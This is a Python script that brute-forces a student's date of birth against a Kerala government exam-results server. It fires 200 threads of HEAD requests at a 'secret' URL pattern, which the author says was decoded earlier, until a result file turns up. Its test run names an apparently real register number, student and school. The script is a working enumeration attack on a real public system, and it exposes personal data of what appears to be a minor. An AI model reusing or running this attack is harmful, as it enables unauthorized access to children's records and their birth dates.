import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta

def check_date(regno, date_str):
    """Checks a single date for a valid result JSON on the KITE server."""
    first_digit = regno[0]
    # The 'secret' folder and filename pattern we decoded earlier
    url = f"https://results.kite.kerala.gov.in/K1TE@SPO@2025@9995994069/K1TE@SPO@20254069_{first_digit}/{date_str}{regno}.json"
    
    try:
        # We only need the headers to check if the file exists (200 OK)
        response = requests.head(url, timeout=2)
        if response.status_code == 200:
            return date_str, url
    except:
        pass
    return None

def strike_dob(regno, start_year=2009, end_year=2011):
    """Parallelized DOB search for a specific register number."""
    print(f"[*] Starting targeted strike for RegNo: {regno}...")
    
    start_date = datetime(start_year, 1, 1)
    end_date = datetime(end_year, 12, 31)
    
    # Generate all possible dates in the range
    dates = []
    current_date = start_date
    while current_date <= end_date:
        dates.append(current_date.strftime("%Y%m%d"))
        current_date += timedelta(days=1)
    
    # Fire off threads
    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = {executor.submit(check_date, regno, d): d for d in dates}
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                found_date, found_url = result
                print(f"[!] SUCCESS: DOB found for {regno} -> {found_date}")
                print(f"[!] Result URL: {found_url}")
                # Once we find it, we stop the executor
                executor.shutdown(wait=False, cancel_futures=True)
                return found_date, found_url
                
    print("[-] No matching DOB found in the specified range.")
    return None

if __name__ == "__main__":
    # Sample Test: RegNo from GHS Ponganad (793120 - AGNEYA I J)
    target_regno = "793120"
    strike_dob(target_regno)
